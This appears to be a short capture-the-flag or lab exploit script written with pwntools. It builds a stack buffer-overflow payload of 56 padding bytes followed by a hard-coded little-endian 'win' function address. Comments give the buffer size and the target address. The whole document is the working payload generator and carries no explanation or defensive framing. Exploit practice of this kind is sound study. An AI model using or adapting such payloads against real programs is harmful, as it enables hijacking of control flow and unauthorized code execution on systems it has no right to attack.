# win addr 0x55 55 55 40 07 aa
# buf = 55 (decimal)
from pwn import *
print(flat({56:b'\xaa\x07\x40\x55\x55\x55'}))

# print('a'*55)
